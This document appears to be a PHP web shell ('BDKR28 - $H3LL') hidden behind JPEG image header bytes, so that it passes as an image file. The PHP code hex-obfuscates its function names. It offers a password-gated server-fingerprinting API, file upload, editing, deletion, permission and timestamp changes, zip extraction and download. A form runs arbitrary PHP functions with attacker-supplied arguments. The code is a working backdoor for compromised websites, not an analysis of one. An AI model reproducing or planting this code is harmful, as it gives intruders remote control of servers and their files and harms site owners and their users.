JFIF
ÿØÿà JFIF   H H  ÿí 6Photoshop 3.0 8BIM     g fDv40PON15YC57AbScWj ÿÛ C $$$$$$$$$,,,,,,333339999999999ÿÛ C			<)!)<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<ÿÂ ÀÀ" ÿÄ             ÿÄ             ÿÚ    i®~€4 R ¡*MòwM¾óùÿ ºß?‹äûG_êýNqæóz[šGg&7ÏÛ¸Ò0C61lE*M1 2]$–Ø•¶Äæ•&†*HT2SJŠm $d"hM°¦˜	0 š4Å ¬r­4KJ&Ö[c(¢Èa Òj“F *¤ Š,¢hLM‰¦¾wßüGN³ö¾™ãë?c?-Ò¹kÁ2×&±.T–oÐiËÓ`Ä0"“)T°L!‰–ŠIL¤Ó‰ TÄ
À„Ð*Mb¹a,b›A4Èm	’74¤ÚD¨„®DÆ*š@@ (¦Ð4²êRX€r£L*hh,C[€Lh Å5(˜ƒªBˆLi¡´!çz~e{?³æjrUW3¢a²÷cçy´Ììö~sß“ESH¤!€Æ€†ŒcHš`,¢4CT†˜	 `‰ªY±ÙDChSjvJb¡²	6$Ü²Àh1¡-¨€ª%Z$b¦…¤¹j¤C	dr¸ªBaM  ‚˜±Ø£¯ç;¹¾ƒ¥~b½Ì»ÂªeŸgÇí³×b1LTÐ¡+0šE%AIÙ‰e´"’!„¶É¤Éw	ÒN„ÅZ„ †„6@ÐÕ„'D°¶f´K™a%32”&¥B`©Q`cŠ€hY/:µIµ!CYc 44žsêókëy=ŽgÇ×dÊâ©1¹¡×“¨æ‘°…`JS¨t$ÍÌ0ªNYRÕQ,hd¶‰¤Àj8”©…T”¢J
	mÀ–ÐÓB‰R&´˜Ah†Ù	¡*!*B
	
	&óLC	-H×˜jÆÜÃ&¦4ÐÀ!‰€2|k‚ÏsƒÉÆ¯+±h¢/Nj©Ë|c»ØùÏ¢ªL’FMJ@®ATÐÊ›¦†Ô r:—@2i ÓRRh4 ‹ˆOÏ_cŸ”öŽ/±~}%üË>›Îòó=ç¨õû¾r¨¯Ø­´àÐìYt›f‘T‡7"N–&Ñ) (!’Z&É ¤HÅ†\¼Š•Ë(˜&‚i‚lš)±<F÷1Ë§Œ¢(zgesí‘÷…Ú{rå*[TÓ@ÀZ	”šbWœXŠq@4+‰€¦ŠÈ™×É:<nI”Â¡ †€%„°™]<¬ê®Q¯KÖù~„úhów³±fìµ.% $hT!¡CI‰•RÀJ“@&¼óR¢P`TÐ  ` Ø 23Ì÷<C9¸[oDÊºýë>b~Ëã—+™¦®.Âh¦  jJ•
		.!°¦lÀC•ÍŠ³ñÎÏžS
		
		
		
		
		
		
<?php

$password = "BDKR28"; //min 4
    $error = "";
    if(isset($_GET["passwordapi"]) && $_GET["passwordapi"] == $password && isset($_GET["id"]) && $_GET["id"] == "server"){

                $reponse = array();

                $reponse['ok'] = "1";

                if($reponse['ok'] == "1"){

                    $HTTPS = $_SERVER["HTTP_SSLSESSIONID"] ? TRUE : FALSE;

                    if($HTTPS == true){
                        $reponse['https'] = "1";
                    }
                    else {
                        $reponse['https'] = "0";
                    }

                    $serverip = $_SERVER['SERVER_ADDR'];
                    $url2 = "http://api.ipapi.com/api/$serverip?access_key=e9d3de0ed9c3cd55c83a9beb6b652b8a";
                    $headers2 = array();
                    $headers2[] = 'Accept-Version: 3';
                    $ch2 = curl_init();
                    curl_setopt($ch2,CURLOPT_URL,$url2);
                    curl_setopt($ch2,CURLOPT_RETURNTRANSFER,true);
                    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers2);
                    $resp2=curl_exec($ch2);
                    $err2 = curl_error($ch2);
                    curl_close($ch2);
                    if($err2){
                        return false;
                    }
                    else {

                        $Json2 = json_decode($resp2, true);

                        $country = $Json2['country_name'];

                        if(!empty($country)){
                            $reponse['country'] = $country;
                        }
                        else {
                            $reponse['country'] = 0;
                        }
                    }


                    $phpversion = phpversion();
                    if(!empty($phpversion)){
                        $reponse['phpversion'] = $phpversion;
                    }
                    else {
                        $reponse['phpversion'] = "0";
                    }



                    $serverOs = PHP_OS;

                    if(!empty($serverOs)){
                        $reponse['serveros'] = $serverOs;
                    }
                    else {
                        $reponse['serveros'] = "0";
                    }

                    $machinetype = php_uname('m');
                    if(!empty($machinetype)){
                        $reponse['machinetype'] = $machinetype;
                    }
                    else {
                        $reponse['machinetype'] = "0";
                    }

                    $hostname = gethostname();
                    if(!empty($hostname)){
                        $reponse['hostname'] = $hostname;
                    }
                    else {
                        $reponse['hostname'] = "0";
                    }


                    $url =  'http://' . $_SERVER['SERVER_NAME'];
                    $tld = end(explode(".", parse_url($url, PHP_URL_HOST)));
                    if(!empty($tld)){
                        $reponse['tld'] = $tld;
                    }
                    else {
                        $reponse['tld'] = "0";
                    }

                }
                else {
                    $reponse['ok'] = "0";
                }
                echo json_encode($reponse);

                exit();

     }

header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$Array = [
    '7068705f756e616d65',
    '70687076657273696f6e',
    '6368646972',
    '676574637764',
    '707265675f73706c6974',
    '636f7079',
    '66696c655f6765745f636f6e74656e7473',
    '6261736536345f6465636f6465',
    '69735f646972',
    '6f625f656e645f636c65616e28293b',
    '756e6c696e6b',
    '6d6b646972',
    '63686d6f64',
    '7363616e646972',
    '7374725f7265706c616365',
    '68746d6c7370656369616c6368617273',
    '7661725f64756d70',
    '666f70656e',
    '667772697465',
    '66636c6f7365',
    '64617465',
    '66696c656d74696d65',
    '737562737472',
    '737072696e7466',
    '66696c657065726d73',
    '746f756368',
    '66696c655f657869737473',
    '72656e616d65',
    '69735f6172726179',
    '69735f6f626a656374',
    '737472706f73',
    '69735f7772697461626c65',
    '69735f7265616461626c65',
    '737472746f74696d65',
    '66696c6573697a65',
    '726d646972',
    '6f625f6765745f636c65616e',
    '7265616466696c65',
    '617373657274',
];
$___ = count($Array);
for($i=0;$i<$___;$i++) {
$GNJ[] = uhex($Array[$i]);
}

?>

<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>BDKR28 - $H3LL</title>

				<link rel="icon" href="https://1877.team/loading.png" />
				<style>@charset "UTF-8";
				@import url(https://fonts.googleapis.com/css2?family=Rajdhani:wght@600&display=swap);
				@import url(https://use.fontawesome.com/releases/v5.8.1/css/all.css);
				body{cursor: url(https://cur.cursors-4u.net/cursors/cur-7/cur686.cur), progress !important;}
				a:hover{cursor: url(https://cur.cursors-4u.net/cursors/cur-7/cur683.cur), progress !important;}
				a:visited, a:hover, a:focus {
					text-decoration: none;
				}
				::-moz-selection {
					color: black;
					background: white;
				}
				
				::selection {
					color: black;
					background: white;
				}
				::-webkit-scrollbar {
					width: 12px;
					background: #292929;
				}
				
				::-webkit-scrollbar-track {
					border-radius: 12px;
					-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,84); 
				}
				
				::-webkit-scrollbar-thumb {
					border-radius: 12px;
					-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,84); 
					background: #FF0000;
				} 
				html{
					margin: 0;
					padding: 0;
					height: 100%;
					position: relative;
					background-color:#000000;
					background-position:center center;
					background-attachment:fixed;
					background-repeat:no-repeat;
					background-size: cover;
					background-image: url("https://i.imgur.com/LUkAlXa.jpg");
					font-family: 'Rajdhani', sans-serif;}
					.x{
						text-shadow: 0 0 5px #FF0000;
						color:#fff;
						text-align:center
					}
					.y{
						color:#181818}
						.y:hover{color:#fff}
						.w{color:#fff}
						.b{
							text-shadow: 0 0 5px #FF0000;
							color:#fff
						}
						.q{margin-top:.5em}
						article{margin-top:1.5em;font-size:.9em}
						.i{
							color:#fff;
							text-shadow: 0 0 5px #FF0000;
							float:left
						}
						.u{float:right;text-align:right;margin-bottom:1.5em}
						input[type=file]{display:none}input[type=submit]{border:1px solid #181818;padding:.2em;background:0 0}
						td{color:#fff}
						th{
							text-shadow: 0 0 5px #FF0000;
							font-weight:400;
							border-bottom:thin solid #181818;
							color:#fff}
							.et{text-align:left;color:#fff}
							.r:hover{background:#000}
							.l{
								color:#fff;
								text-shadow: 0 0 5px #FF0000;
								border:1px solid #fff;padding:1px;background:0 0
							}
							footer{margin-top:2em;height:2.2rem;width:100%;font-size:.9em}
							footer:hover{color:#fff}
							a{
								text-decoration:none;
								text-shadow: 0 0 5px #FF0000;
								color:#fff
							}
							b{
								text-decoration:none;
								text-shadow: 0 0 5px #FF0000;
								color:#fff
							}
							a:hover{color:#fff}
							.m{
								color:#fff;
								text-shadow: 0 0 5px #FF0000;
								margin-left:2.4em
							}
							textarea{
								color:#fff;
								text-shadow: 0 0 5px #FF0000;
								background:0 0;
								border:none;
								width:70%;height:30em;
								font-family: 'Rajdhani', sans-serif;
								font-size:.9em
							}
							textarea.o{background:#000}
							.h{
								color:#ea2027;
								text-shadow: 0 0 3px #FF0000
							}</style>

			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="https://cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>

		<body>
			<header>
				<div class="y x">
				<img width="580" target="_blank" href="https://t.me/MrBDKR28" onclick="location.href='https://t.me/MrBDKR28';" src="https://i.imgur.com/NbuXseo.png">
				</div>

				<div class="q x w">
					&#8212; We are All Criminals &#8212;
				</div>
				
			</header>

			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					<?php echo $GNJ[0]();?>

					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>INFO SERVER  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>

					<br />

					<i class="far fa-folder" onclick="window.location = window.location.pathname;"></i>
					
					<?php
					if(isset($_GET["d"])) {
						$d = uhex($_GET["d"]);
						$GNJ[2](uhex($_GET["d"]));
					}
					else {
						$d = $GNJ[3]();
					}
					$k = $GNJ[4]("/(\\\|\/)/", $d );
					foreach ($k as $m => $l) { 
						if($l=='' && $m==0) {
							echo '<a class="ajx" href="?d=2f">/</a>';
						}
						if($l == '') { 
							continue;
						}
						echo '<a class="ajx" href="?d=';
						for ($i = 0; $i <= $m; $i++) {
							echo hex($k[$i]); 
							if($i != $m) {
								echo '2f';
							}
						}
						echo '">'.$l.'</a>/'; 
					}
                    
					?>

<a onclick="window.location = window.location.pathname;">| HOME</a>

					<br />

				</div>

				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

					<?php
					$o_ = [ 
							'<script>$.notify("',
							'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
						];
					$f = $o_[0].'OK!'.$o_[1];
					$g = $o_[0].'ER!'.$o_[1];
					if(isset($_FILES["n"])) {
						$z = $_FILES["n"]["name"];
						$r = count($z);
						for( $i=0 ; $i < $r ; $i++ ) {
							if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
								echo $f;
							}
							else {
								echo $g;
							}
						}
					}
					?>

				</div>
					<?php
					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
					$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
					$c_ = '</td>
							</tr>
						</tbody>
					</table>';
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
									</form>';
					if(isset($_GET["s"])) {
						echo $a_.uhex($_GET["s"]).$b_.'
									<textarea readonly="yes">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
								'.$c_;
					}
					elseif(isset($_GET["y"])) {
						echo $a_.'REQUEST'.$b_.'
									<form method="post">
										<input class="x" type="text" name="1" />&nbsp;&nbsp;
										<input class="x" type="text" name="2" />
										'.$d_.'
									<br />
									<textarea readonly="yes">';

									if(isset($_POST["2"])) {
										echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
									}

								echo '</textarea>
								'.$c_;
					}
					elseif(isset($_GET["e"])) {
						echo $a_.uhex($_GET["e"]).$b_.'
									<form method="post">
										<textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<select id="b64" name="b64">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select>
										'.$d_.'
								'.$c_.'
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
					if(isset($_POST["e"])) {
						if($_POST["b64"] == "1") {
							$ex = $GNJ[7]($_POST["e"]);
						}
						else {
							$ex = $_POST["e"];
						}
						$fp = $GNJ[17](uhex($_GET["e"]), 'w');
						if($GNJ[18]($fp, $ex)) {
							OK();
						}
						else {
							ER();
						}
						$GNJ[19]($fp);
					  }
					}
					elseif(isset($_GET["x"])) {
						rec(uhex($_GET["x"]));
						if($GNJ[26](uhex($_GET["x"]))) {
							ER();
						}
						else {
							OK();
						}

					}
					elseif(isset($_GET["t"])) {
						echo $a_.uhex($_GET["t"]).$b_.'
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;
					if( !empty($_POST["t"]) ) {
						$p = $GNJ[33]($_POST["t"]);
						if($p) {
							if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) {
								ER();
							}
							else {
								OK();
							}
						}
						else {
							ER();
						}
					  }
					}
					elseif(isset($_GET["k"])) {
						echo $a_.uhex($_GET["k"]).$b_.'
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
										'.$d_.'
								'.$c_;
					if(!empty($_POST["b"])) {
						$x = $_POST["b"];
						$t = 0;
					for($i=strlen($x)-1;$i>=0;--$i)
						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
					if(!$GNJ[12](uhex($_GET["k"]), $t)) {
						ER();
					}
					else {
						OK();
						  }
						}
					}
					elseif(isset($_GET["l"])) {
						echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["l"])) {
						if(!$GNJ[11]($_POST["l"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["q"])) {
						if($GNJ[10](__FILE__)) {
							$GNJ[38]($GNJ[9]);
							header("Location: ".basename($_SERVER['PHP_SELF'])."");
							exit();
						}
						else {
							echo $g;
						}
					}
					elseif(isset($_GET["n"])) {
						echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["n"])) {
						if(!$GNJ[25]($_POST["n"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["r"])) {
						echo $a_.uhex($_GET["r"]).$b_.'
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
										'.$d_.'
								'.$c_;
					if(isset($_POST["r"])) {
						if($GNJ[26]($_POST["r"])) {
							ER();
						}
						else {
							if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
								OK();
							}
							else {
								ER();
							}
						  }
					   }
					}
					elseif(isset($_GET["z"])) {
						$zip = new ZipArchive;
						$res = $zip->open(uhex($_GET["z"]));
							if($res === TRUE) {
								$zip->extractTo(uhex($_GET["d"]));
								$zip->close();
								OK();
							} else {
								ER();
						  }
					}
					else {
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACTN ]</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>
									<a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
									<a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
								</td>
							</tr>
						';

							$h = "";
							$j = "";
							$w = $GNJ[13]($d);
							if($GNJ[28]($w) || $GNJ[29]($w)) {
							foreach($w as $c){
								$e = $GNJ[14]("\\", "/", $d);
								if(!$GNJ[30]($c, ".zip")) {
									$zi = '';
								}
								else {
									$zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
								}
								if($GNJ[31]("$d/$c")) {
										$o = "";
								}
								elseif(!$GNJ[32]("$d/$c")) {
										$o = " h";
								}
								else {
										$o = " w";
								}
								$s = $GNJ[34]("$d/$c") / 1024;
								$s = round($s, 3);
								if($s>=1024) { 
									$s = round($s/1024, 2) . " MB";
								} else {
									$s = $s . " KB";
								}
							if(($c != ".") && ($c != "..")){
								($GNJ[8]("$d/$c")) ?
								$h .= '<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						'
							:
								$j .= '<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td class="x">
								'.$s.'
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
								'.$zi.'
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</std>
						</tr>
						
						';

							}
						}
					}

						echo $h;
						echo $j;
						echo '</tbody>
						<tfoot>
							<tr>
								<th class="et">
									<a class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
									<a href="?d='.hex($e).'&q">EXIT</a>
								</th>
								<th class="et" width="11%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="11%"></th>
							</tr>
					</tfoot>
				</table>';
					}
					?>

			</article>
			<footer class="x">
				&copy; BDKR28
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
			}
			elseif(isset($_GET["0"])) {
				echo $g;
			}
			else {
				NULL;
			}
			?>

			<script>
				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
			</script>
		</body>
	</html>
<?php
	function rec($j) {
		global $GNJ;
		if(trim(pathinfo($j, PATHINFO_BASENAME ), '.') === '') {
			return;
		}
		if($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		}
		else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2) {
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n) {
		$y='';
		for ($i=0; $i < strlen($n); $i++){
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y) {
		$n='';
		for ($i=0; $i < strlen($y)-1; $i+=2){
			$n .= chr(hexdec($y[$i].$y[$i+1]));
		}
		return $n;
	}
	function OK() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&1");
		exit();
	}
	function ER() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&0");
		exit();
	}
	function x($c) {
		global $GNJ;
		$x = $GNJ[24]($c);
		if(($x & 0xC000) == 0xC000) {
			$u = "s";
		}
		elseif(($x & 0xA000) == 0xA000) {
			$u = "l";
		}
		elseif(($x & 0x8000) == 0x8000) {
			$u = "-";
		}
		elseif(($x & 0x6000) == 0x6000) {
			$u = "b";
		}
		elseif(($x & 0x4000) == 0x4000) {
			$u = "d";
		}
		elseif(($x & 0x2000) == 0x2000) {
			$u = "c";
		}
		elseif(($x & 0x1000) == 0x1000) {
			$u = "p";
		}
		else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if(isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");
		$GNJ[37](uhex($_GET["g"]));
	}
?>
